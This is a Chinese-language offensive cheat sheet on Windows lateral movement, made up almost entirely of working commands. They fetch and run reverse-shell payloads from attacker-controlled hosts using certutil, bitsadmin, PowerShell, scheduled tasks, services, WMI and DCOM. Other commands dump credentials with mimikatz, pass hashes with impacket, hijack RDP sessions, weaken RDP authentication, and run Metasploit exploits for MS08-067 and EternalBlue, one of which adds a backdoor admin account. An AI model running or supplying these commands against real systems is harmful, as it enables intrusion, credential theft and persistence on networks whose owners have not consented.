# **横向移动**

## 0x01 文件传输

### IPC$

建立IPC$连接需要具备以下两个条件：①远程主机开启了IPC连接。

②远程主机的139端口和445端口开放。

    
    
    net use \\10.10.10.19\IPC$ "admin@123"   /user:"Administrator"               #建立连接
    dir \\10.10.10.19\C$													#列出目标C盘的目录
    copy .\reverse_tcp.exe   \\10.10.10.19\C$								  #将当前目录文件拷贝到目标C盘
    

### 搭建SMB服务器

    
    
    mkdir /root/share
    python smbserver.py evilsmb /root/share -smb2support
    

### 搭建HTTP服务器

    
    
    python -m SimpleHTTPServer 1234
    python3 -m http.server 1234
    

### 搭建FTP服务器

    
    
    #ftp非交互式下载文件
    python3 -m pyftpdlib -p 21 
    
    echo open 10.10.16.3 21> ftp.txt&echo USER anonymous >> ftp.txt&echo anonymous>> ftp.txt&echo bin>> ftp.txt&echo GET revshell.exe >> ftp.txt&echo bye>> ftp.txt    #在目标机器上写文件
    #关于上面命令的解释：
    #open 10.10.16.3 21             连接FTP服务器  21端口
    #USER anonymous                 用户名anonymous
    #pass						 密码随便输入，这里用pass
    #bin                            二进制模式
    #GET revshell.exe               下载文件revsehll.exe到本地
    #bye                            断开连接
    ftp -n -v -s:ftp.txt      #  -n 自动登录   -v 详细显示  -s 逐条执行文件中的命令  #在目标机器上执行
    

### Certutil

Certutil是Windows自带的命令行工具，用于管理Windows证书并作为证书服务的一部分安装。Certutil提供了从网络中下载文件的功能，测试人员可以在远程主机上执行Certutil命令，控制其下载预先部署在可控服务器上的恶意文件，如攻击载荷等。

    
    
    certutil -urlcache  -split -f http://10.10.10.10/MS10-059.exe MS10-059.exe
    

### Bitsadmin

    
    
    bitsadmin /rawreturn /transfer down "http://192.168.26.20:80/shell.exe"  C:\reverse_tcp.exe #Windows7后系统自带工具
    

### powershell

    
    
    (New-Object Net.WebClient).DownloadFile('http://192.168.26.20:80/shell.exe','C:\reverse_tcp.exe')
    iwr -uri  http://10.10.16.10/ncxw.exe -outfile ncxw.exe
    powershell -nop -exec bypass -c "iex(New-Object Net.webclient).downloadstring('http://10.10.16.12/PowerView.ps1')"
    

## 0x02 计划任务通过UNC路径加载执行

    
    
    schtasks /Create /S 10.10.10.19 /TN schtasksname /SC minute /MO 1 /TR C:\reverse.exe /RU  System /F /U Administrator /P Admin@123										 #创建
    
    #/S,指定要连接到的系统；/TN,指定要创建的计划任务的名称；/SC,指定计划任务执行频率
    #/M0,指定计划任务执行周期；/TR,指定计划任务运行的程序路径；/RU,指定计划任务运行的用户权限
    #/F,如果指定的任务已经存在，则强制创建
    
    schtasks /RUN /S 10.10.10.19 /I /TN schtasksname         #执行
    schtasks /Delete /S 10.10.10.19 /TN schtasksname  /F     #删除
    

①在可控的服务器上启一个smb服务器开启匿名共享

    
    
    mkdir /root/smbshare
    python3 smbserver.py evilsmb /root/smbshare -smb2support
    

②执行以下命令，在远程主机（10.10.10.19)创建计划任务，使用UNC路径加载位于192.168.26.20共享中的攻击载荷

    
    
    schtasks /Create /S 10.10.10.19 /TN schtasksname /Sc minute /MO 1 /TR \\192.168.26.20\  evilsmb\reverse_tcp.exe /RU System /F /U Administrator /P Admin@123
    

③等待攻击载荷执行，拿到反弹shell

## 0x03 利用系统服务

### 创建远程服务

该方式需要 **拥有两端主机的管理员权限和PC$连接** ，  
具体操作如下。  
①利用已建立的共享连接向远程主机(10.10.10.19)上传攻击载荷。  
②利用已建立的PC连接在远程主机上创建系统服务。执行以下命令：

    
    
    sc \\10.10.10.19 create schtasksname binpath="cmd.exe /k C:\reverse_tcp.exe"
    #binpath,指定服务启动时运行的二进制文件，注意"="后需要有一个空格,
    #在远程主机上创建一个名为schtasksname的系统服务，服务启动时将执行上传的攻击载荷
    sc \\10.10.10.19 start schtasksname   #启动服务
    sc \\10.10.10.19 delete schtasksname  #删除服务
    

### SCshell

SCShell需要提供远程主机的管理员权限用户的凭据，并且需要已知远程主机上的系统服务名称。方法如下：

    
    
    SCShell.exe 10.10.10.19 XblAuthManager "C:\Windows\System32\cmd.exe /c calc" hack-my.com  Administrator Admin@123
    SCShell.exe <Target> <Service Name> <Payload> <Domain> <Username> <Password>
    

①通过Metasploit启动一个Web Delivery,并生成用于Regsvr232执行的Payload

    
    
    msfconsole
    exploit/multi/script/web_delivery
    show options        #按照提示配置就行
    exploit
    然后我们就可以获得一个dll
    

![图片.png](https://image.3001.net/images/20221119/1668848884_63789cf4cbd6ba8d8dd69.png!small)

②通过SCShell在远程主机上执行生成的Payload,命令如下：

    
    
    SCShell.exe 10.10.10.19 XblAuthManager "C:\Windows\System32\cmd.exe /c C:\Windows\System32\regsvr.32.exe /s /n /u /i:http://192.168.2.143:8080/vEu7VzWEwW9DltR.sct scrobj.dll" hack-my.com Administrator Admin@123
    

执行后，远程主机成功上线

### 远程桌面

执行以下命令：

    
    
    #若字段值为0,则说明RDP服务已启动；若为1，则说明RDP服务已禁用。
    reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
    
    
    
    #开启远程桌面连接功能
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
    
    
    
    #关闭“仅允许运行使用网络级别身份验证的远程桌面的计算机连接”（鉴权）
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v  UserAuthentication /t REG_DWORD /d 0
    
    
    
    #设置防火墙策略放行3389端口
    netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
    
    
    
    #通过WMI来开启其远程桌面功能：需要指定远程主机的IP、主机名和用户凭据，如下所示
    wmic /Node:10.10.10.19 /User:Administrator /Password:Admin@123 RDTOGGLE WHERE ServerName ='WIN2016-WEB3' call SetAllowTSConnections 1
    

### RDP hijacking

 **远程桌面劫持需要获取系统SYSTEM权限**
并执行scon命令。该命令提供了一个切换用户会话的功能。在正常情况下，切换会话时需要提供目标用户的登录密码，但在SYSTEM权限下能够完全绕过验证，不输入密码即可切换到目标用户的会话，从而实现未授权登录。

    
    
    query user         #也可以quser 或者 qwinsta 查看会话id
    #MSF中获取到system权限后执行以下命令
    shell
    tscon  9                #假设我们想劫持的用户ID为9   执行该命令即可
    --------------------------------------------------------------------------------------------------------------------    psexec -s \\localhost cmd
    tscon 2 /dest:console           #这里的ID为被劫持的win用户ID
    -------------------------------------------------------------------------------------------------------------------    另一种方法是创建一个服务，将选定的会话连接到我们的会话。
    
    C:\Windows\system32>query user 
     USERNAME SESSIONNAME ID STATE IDLE TIME LOGON TIME administrator 1   Disc 1 3/12/2017 3:07 PM 
    >localadmin             rdp-tcp#55           2 Active . 2017 年 3 月 12 日下午 3:10 
    C:\Windows\system32>
    
    C:\Windows\system32>sc create sesshijack binpath= "cmd.exe /k tscon 1 /dest: rdp-tcp#55 " 
    [SC] CreateService 成功
    
    net setart sesshijack
    

但高版本例如Windows10的服务似乎就不能直接获取system权限cmd，但可以直接跟上tscon命令，默认情况下服务将作为SYSTEM权限运行。

https://www.ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement

http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html

### PSexec

PsExec原理是通过SMB连接到服务端的Admin$共享，并释放名为“psexesvc..exe”的二进制文件，然后注册名为“PSEXESVC”服务。当客户端执行命令时，服务端通过PSEXESVC服务启动相应的程序执行命令并回显数据。运行结束后，PSEXESVC服务会  
被删除。

用PsExec进行远程操作需要具备以下条件：

①远程主机开启了Admin$共享；

②远程主机未开启防火墙或放行445端口。执行以下命令：

    
    
    PsExec.exe -accepteula \10.10.10.19 -u HACK-MY\Administrator -p Admin@123 -s cmd.exe
    #-accepteula,禁止弹出许可证对话框；-u,指定远程主机的用户名；-p,指定用户的密码
    #-S,以SYSTEM权限启动进程，如果未指定该参数，就将以管理员权限启动进程
    

在内网渗透中，如果已建立IPC$链接，那么可以直接使用PsExec连接远程主机

    
    
    PsExec.exe -accepteula \10.10.10.19 cmd.exe
    
    
    
    psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e' -target-ip 10.10.10.175 administrator@10.10.10.175
    psexec.py Administrator:Ticketmaster1968@10.10.10.100
    

## 0x04 WMI的利用

在横向移动时，测试人员可以利用WMI提供的管理功能，通过已获取的用户凭据，与本地或远程主机进行交互，并控制其执行各种行为。目前有两种常见的利用方法：

一是通过调用WMI的类方法进行远程执行，如Win32 Process类中的Create方法可以在远程主机上创建进程，Win32
Product类中的Install方法可以在远程主机上安装恶意的MSI; 二是远程部署WMI事件订阅，在特定条的事件发生时触发攻击。
利用WMI进行横向移动需要具备以下条件：①远程主机的WMI服务为开启状态默认开启；

②远程主机防火墙放行135端口，这是WMI管理的默认端口。

    
    
    #查询指定远程主机的进程
    wmic /node:10.10.10.19 /user:Administrator /password:Admin@123 process list brief
    #/node,指定远程主机的地址；/user,指定远程主机的用户名；/password,指定用户的密码
    
    
    
    #通过调用Win32 Process.Create方法在远程主机上创建进程，启动CMD来执行系统命令，由于WMI执行命令无回显，所以b
    wmic /node:10.10.10.19 /user:Administrator /password:Admin@123 process call create "cmd.exe /c ipconfig C:\result.txt"
    

### **远程安装MSI文件**

通过调用Win32 Product.Install方法，可以控制远程主机安装恶意的MSI(Microsoft Installer)文件，从而获取其权限。

①使用Metasploit生成一个恶意的MSI文件：

    
    
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.26.20 LPORT=4444 -f msi -o reverse_tcp.msi
    

③在一台测试人员可控的服务器上搭建SMB共享服务器，并将生成的MSI文件放入共享目录

    
    
    mkdir /root/share
    python smbserver.py evilsmb /root/share -smb2support
    

③在跳板机上执行以下命令：

    
    
    wmic /node:10.10.10.19 /user:Administrator /password:Admin@123 product call install
    PackageLocation="\\192.168.26.20\evilsmb\reverse_tcp.msi"
    

控制远程主机（10.10.10.19)，通过UNC路径进行远程加载测试人员服务器的MSI文件并进行安装，可以获取远程主机的权限

###  **常见工具**

 **impacket wmiexec.py**

**前提：**主机开启135 445端口

    
    
    python wmiexec.py HACK-MY/Administrator:Admin\@123@10.10.10.19
    python wmiexec.py <Domian>/<Username>:<Password>@<IP>
    

windows平台下可以使用Pyinstaller将wmiexec.py打包成独立的EXE可执行文件，用法与上面相同

    
    
    pip install pyinstaller
    然后在 wmiexec.py所在的目录执行以下命令
    pyinstaller -F wmiexec.py
    

### **WMI事件订阅的利用**

前提：具备目标的管理员权限

①把攻击载荷放到smb服务器上

    
    
    mkdir /root/share
    python smbserver.py evilsmb /root/share -smb2support
    

②在跳板机上执行以下命令，运行[Sharp-VMIEvent](https://github.com/wh0Nsq/Sharp-WMIEvent)

    
    
    Sharp-WMIEvent -Trigger Interval -IntervalPeriod 60 -ComputerName 10.10.10.19 -Domain hack-my.com -Username Administrator -Password Admine123 -Command "cmd.exe c\10.10.10.147\evilsmb\reverse_tcp.exe"
    

这将在远程主机上部署一个随机命名的永久事件订阅，并每隔60秒执行一次SMB共享中的攻击载荷，使远程主机上线。

## 0X05 DCOM的利用

### MMC20.Application

前提：远程主机未开启防火墙、管理员权限的powershell

适用：适用于WIN7以上系统

    
    
    Get-CimInstance Win32_DCOMApplication
    

①把攻击载荷放到smb服务器上

    
    
    mkdir /root/share
    python smbserver.py evilsmb /root/share -smb2support
    

②在管理员权限的Powershell中执行以下命令

    
    
    #通过ProgID与DC0M进行远程交互，并创建MMC20.Application对象的实例
    $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.10.19"))
    #调用ExecuteShellCommand方法启动进程，以运行攻击载荷
    $com.Document.Activeview.ExecuteShellCommand('cmd.exe',$null,"/c \\192.168.26.20\evilsmb\reverse_tcp.exe","Minimized")
    

### **ShellWindows**

适用：适用于WIN7以上系统,

Tip: 不会创建新进程，而是通过已有的explorer..exe来托管子进程

    
    
    $com = [Activator]::CreateInstance([Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"10.10.10.19"))
    #调用ShellExecute方法启动子进程
    $com.item().Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\Windows\System32",$null,0)
    

### **ShellBrowserWindows**

适用：win10和winserver-2012等系统

Tip: 不会创建新进程，而是通过已有的explorer..exe来托管子进程

    
    
    #通过CLSID与DCOM进行远程交互，并创建ShellBrowserwindow对象的实例
    $com = [Activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","10.10.10.19"))
    #调用ShellExecute方法启动子进程
    $com.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\Windows\System32",$null,0)
    

## 0X06 Evil-WinRM

[Evil-Winrm](https://github.com/Hackplayers/evil-winrm)是基于WinRM
Shell的渗透框架，可通过提供的用户名密码或用户哈希值在启用了WinRM服务的目标主机上完成攻击任务。

    
    
    evil-winrm -i 10.10.10.169 -P 5985 -u melanie -p 'Welcome123!'
    evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee
    evil-winrm -u svc_loanmanager -p 'Moneymakestheworldgoround!' -i 10.10.10.175
    *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload SharpHound.exe    上传文件
    *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> download 20221007230250_BloodHound.zip   下载文件
    

## 0x07 PTH

 **mimikatz PTH**

前提：管理员权限

    
    
    mimikatz.exe "privilege:debug" "sekurlsa:logonpasswords full" exit     #抓取HASH
    
    
    
    mimikatz.exe "privilege:debug" "sekurlsa:pth /user:Administrator /domain:hack-my.com
    /ntlm:570a9a65db8fba761c1008a51d4c95ab" exit
    #/user,指定要传递的用户名；/domain,指定当前所处域名或工作组名；/ntlm,指定用户哈希
    

**impacket PTH**

    
    
    psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e' -dc-ip 10.10.10.175 administrator@10.10.10.19
    
    
    
    psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e' administrator@10.10.10.19
    
    
    
    wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e EGOTISTICAL-BANK.LOCAL/administrator@10.10.10.175
    

**PTH登录远程桌面**

前提： ①远程主机开启了“受限管理员”模式， ②用于登录远程桌面的用户位于远程主机的管理员组中； ③目标用户的哈希。  
Windows Server20l2R2及以上版本支持受限管理员模式(Restricted Admin
Mode)。该模式在Windows8.1和Windows Server  
2012R2上默认开启，在其他主机中可以通过执行以下命令手动开启。

    
    
    reg add "HKLM\System\CurrentControlset\Control\Lsa"/v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
    
    
    
    reg query "HKLM\System\CurrentControlSet\Control\Lsa"/v DisableRestrictedAdmin   #查询是否开启，0开启，1关闭
    
    
    
    #若远程主机开启了受限管理员模式，则可以通过Mimikatz进行利用：
    privilege:debug 
    sekurlsa:pth /user:Administrator /domain:hack-my.com /ntlm:570a9a65db8fba761c1008a51d4c95ab "/run:mstsc.exe /restrictedadmin"
    

## 0x08 相关漏洞

###  **MS08-067**

 **RPC远程缓冲区溢出导致的远程代码执行漏洞**

适用：Windows 2000;XP;Server 2003;Vista;Server 2008;7 Beta

    
    
    use exploit/windows/smb/ms08_067_netapi     #使用模块
    set rhosts 172.16.5.27      #设置靶机ip
    set lhost 172.16.5.28      #设置本地ip
    set payload generic/shell_bind_tcp     #设置payload
    exploit
    

### **EhernalBlue(MS17-010)**

 **SMBv1 和 NBT 中的远程代码执行漏洞**

适用：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows
7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。（包括但不限于）

    
    
    use auxiliary/scanner/smb/smb_ms17_010             #扫描是否存在该漏洞
    set rhosts 10.10.10.14    #设置目标主机的IP,也可以设置整个IP段
    set threads 10
    exploit
    
    
    
    use exploit/windows/smb/ms17_010_eternalblue    #漏洞利用
    set rhosts 10.10.10.14                          #设置目标主机的IP,也可以设置整个IP段
    set payload windows/x64/meterpreter/reverse_tcp
    set lhost 10.10.10.147
    set lport 4444
    exploit
    
    
    
    use exploit/windows/smb/ms17_010_psexec    #漏洞利用
     set payload windows/meterpreter/bind_tcp
     set rhost 192.168.33.33
     exploit
    
    
    
    use auxiliary/admin/smb/ms17_010_command    #漏洞利用
    set rhosts=192.168.26.33.33
    set COMMAND net user hack  hack123 /add
    set COMMAND net localgroup administrators hack  /add
    exploit
    

